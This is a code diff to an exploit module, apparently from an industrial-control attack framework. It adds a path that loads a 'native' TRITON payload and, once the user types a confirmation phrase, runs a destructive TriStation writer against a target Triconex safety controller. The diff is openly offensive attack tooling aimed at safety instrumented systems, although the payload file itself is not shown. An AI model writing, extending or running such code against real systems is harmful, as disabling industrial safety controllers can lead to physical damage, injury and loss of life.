@@ -188,7 +188,32 @@ class Exploit(Exploit):
             print_info("  CVE-2019-6829: https://www.cve.org/CVERecord?id=CVE-2019-6829")
             return
 
-        # Real probe execution
+        # Check for native payload (GitHub clone only)
+        try:
+            from industrialxpl.core.native import NativePayloadLoader
+            if NativePayloadLoader.available() and NativePayloadLoader.get("triton"):
+                print_info("")
+                print_info("[native] Full TRITON implementation available (repo clone detected).")
+                print_info("[native] Use 'run' with destructive=true to use native TriStation writer.")
+                print_info("[native] Native payload: contrib/native-payloads/triton/payload.py")
+                print_info("")
+                if self.destructive:
+                    def _confirm():
+                        try:
+                            ans = input("  Type 'EXECUTE TRITON AGAINST {}: ".format(self.target))
+                            return ans.strip() == "EXECUTE TRITON AGAINST {}".format(self.target)
+                        except (EOFError, KeyboardInterrupt):
+                            return False
+                    NativePayloadLoader.execute_native(
+                        "triton", self.target,
+                        {"port": self.port, "timeout": self.timeout, "inject_nop": True, "halt": False},
+                        confirm_callback=_confirm,
+                    )
+                    return
+        except ImportError:
+            pass
+
+        # Real probe execution (TTP-only, no native payload)
         print_warning(
             "[TRITON TTP] Probing Triconex at {}:{}/UDP ...".format(self.target, self.port)
         )
